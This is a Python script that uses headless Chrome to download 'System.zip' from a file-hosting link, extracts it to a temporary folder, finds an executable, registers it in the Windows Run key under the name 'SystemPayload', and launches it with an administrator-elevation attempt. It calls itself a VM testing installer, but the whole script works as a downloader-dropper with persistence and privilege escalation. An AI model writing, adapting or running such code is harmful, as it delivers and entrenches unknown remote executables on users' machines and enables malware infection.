import os
import time
import zipfile
import subprocess
import winreg
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager

# === CONFIG ===
DOWNLOAD_DIR = os.path.join(os.path.expanduser("~"), "Downloads")
TEMP_EXTRACT_DIR = os.path.join(os.environ["TEMP"], "auto_extracted_payload")
SYSTEM_ZIP_NAME = "System.zip"
os.makedirs(DOWNLOAD_DIR, exist_ok=True)
os.makedirs(TEMP_EXTRACT_DIR, exist_ok=True)

URL = "https://store10.gofile.io/download/web/b019c987-ce93-4f85-a513-c8e1908b9970/System.zip"

# === HELPER: Check if System.zip already exists ===
def is_zip_downloaded():
    zip_path = os.path.join(DOWNLOAD_DIR, SYSTEM_ZIP_NAME)
    return os.path.exists(zip_path)

# === HELPER: Check if ZIP was already extracted ===
def is_already_extracted():
    for root, dirs, files in os.walk(TEMP_EXTRACT_DIR):
        for file in files:
            if file.lower().endswith('.exe'):
                return True
    return False

# === HELPER: Check if EXE is already in registry Run key ===
def is_in_startup(exe_name="SystemPayload"):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_READ)
        try:
            value, _ = winreg.QueryValueEx(key, exe_name)
            winreg.CloseKey(key)
            if os.path.exists(value):
                print(f"[INFO] Found existing auto-start entry: {value}")
                return True
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
    except Exception as e:
        print(f"[WARN] Could not read registry: {e}")
    return False

# === CHROME OPTIONS — HEADLESS + AUTO DOWNLOAD ===
opts = Options()
opts.add_argument("--headless=new")  # Modern headless mode
opts.add_argument("--disable-gpu")
opts.add_argument("--window-size=1920,1080")
opts.add_argument("--disable-dev-shm-usage")
opts.add_argument("--no-sandbox")
opts.add_experimental_option("prefs", {
    "download.default_directory": DOWNLOAD_DIR,
    "download.prompt_for_download": False,
    "download.directory_upgrade": True,
    "safebrowsing.enabled": True,
    "profile.default_content_setting_values.automatic_downloads": 1,
    "profile.default_content_settings.popups": 0
})

# === START ===
print("=== System.zip Auto-Installer (Headless | Testing/VM Use Only) ===")

# === STEP 1: Check if already installed ===
if is_in_startup() and is_already_extracted() and is_zip_downloaded():
    print("[INFO] System.zip already installed and configured. Skipping setup.")
    exe_to_launch = None
    for root, dirs, files in os.walk(TEMP_EXTRACT_DIR):
        for f in files:
            if f.lower().endswith('.exe'):
                exe_to_launch = os.path.join(root, f)
                break
        if exe_to_launch: break

    if exe_to_launch:
        print(f"[INFO] Relaunching: {exe_to_launch}")

        def launch_exe(exe_path, as_admin=True):
            try:
                if as_admin:
                    result = subprocess.run([
                        "powershell", "-Command",
                        f"Start-Process '{exe_path}' -Verb RunAs -PassThru"
                    ], capture_output=True, text=True, check=False)

                    if result.returncode != 0:
                        print(f"[WARN] Admin launch failed: {result.stderr.strip() or 'Unknown error'}. Falling back to normal launch.")
                        as_admin = False
                    else:
                        print("[SUCCESS] Launched with admin rights.")
                        return True

                if not as_admin:
                    subprocess.Popen([exe_path], shell=True)
                    print("[SUCCESS] Launched normally (without admin).")
                    return True

            except Exception as e:
                print(f"[ERROR] Failed to launch: {e}")
                return False

        launch_exe(exe_to_launch, as_admin=True)
    else:
        print("[WARN] No EXE found to relaunch.")
    exit(0)

# === STEP 2: Download if not present ===
if not is_zip_downloaded():
    print("[INFO] System.zip not found. Starting headless download...")
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=opts)

    try:
        driver.get(URL)
        time.sleep(5)

        # Try clicking download button if exists
        try:
            download_button = driver.find_element(By.CSS_SELECTOR, "button.item_download")
            download_button.click()
            print("[INFO] Download button clicked.")
        except Exception as e:
            print(f"[WARN] No download button found: {e}. Assuming auto-download.")

        # Wait for download
        before = set(os.listdir(DOWNLOAD_DIR))
        downloaded_file = None
        timeout = 600
        start_time = time.time()

        while time.time() - start_time < timeout:
            time.sleep(2)
            now = set(os.listdir(DOWNLOAD_DIR))
            new_files = [f for f in (now - before) if f == SYSTEM_ZIP_NAME and not f.endswith(('.crdownload','.tmp','.part'))]
            if new_files:
                downloaded_file = os.path.join(DOWNLOAD_DIR, new_files[0])
                break

        if not downloaded_file:
            raise Exception("[ERROR] Download did not complete.")

        print(f"[SUCCESS] Downloaded: {downloaded_file}")

    finally:
        driver.quit()
else:
    print("[INFO] System.zip already exists. Skipping download.")
    downloaded_file = os.path.join(DOWNLOAD_DIR, SYSTEM_ZIP_NAME)

# === STEP 3: Extract if not already extracted ===
if not is_already_extracted():
    print(f"[INFO] Extracting {downloaded_file} to {TEMP_EXTRACT_DIR}...")
    with zipfile.ZipFile(downloaded_file, 'r') as zip_ref:
        zip_ref.extractall(TEMP_EXTRACT_DIR)
    print("[SUCCESS] Extraction complete.")
else:
    print("[INFO] Files already extracted. Skipping extraction.")

# === STEP 4: Find EXE ===
exe_path = None
for root, dirs, files in os.walk(TEMP_EXTRACT_DIR):
    for file in files:
        if file.lower().endswith('.exe'):
            exe_path = os.path.join(root, file)
            print(f"[FOUND] Executable: {exe_path}")
            break
    if exe_path:
        break

if not exe_path:
    raise FileNotFoundError("[ERROR] No .exe found in extracted files.")

# === STEP 5: Add to Startup (if not already) ===
def add_to_startup(exe_full_path, name="SystemPayload"):
    if is_in_startup(name):
        print("[INFO] Already in startup. Skipping registry modification.")
        return

    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, name, 0, winreg.REG_SZ, exe_full_path)
        winreg.CloseKey(reg_key)
        print(f"[SUCCESS] Added to registry auto-start: {name} -> {exe_full_path}")
    except Exception as e:
        print(f"[ERROR] Failed to add to registry: {e}")

add_to_startup(exe_path)

# === STEP 6: Launch as Administrator (with fallback to normal) ===
print("[INFO] Attempting to launch executable as Administrator...")

def launch_exe(exe_path, as_admin=True):
    try:
        if as_admin:
            result = subprocess.run([
                "powershell", "-Command",
                f"Start-Process '{exe_path}' -Verb RunAs -PassThru"
            ], capture_output=True, text=True, check=False)

            if result.returncode != 0:
                print(f"[WARN] Admin launch failed: {result.stderr.strip() or 'Unknown error'}. Falling back to normal launch.")
                as_admin = False
            else:
                print("[SUCCESS] Launched with admin rights.")
                return True

        if not as_admin:
            subprocess.Popen([exe_path], shell=True)
            print("[SUCCESS] Launched normally (without admin).")
            return True

    except Exception as e:
        print(f"[ERROR] Failed to launch: {e}")
        return False

launch_exe(exe_path, as_admin=True)

print("\n✅ INSTALL & LAUNCH COMPLETE (Headless Mode). Monitor behavior in VM.")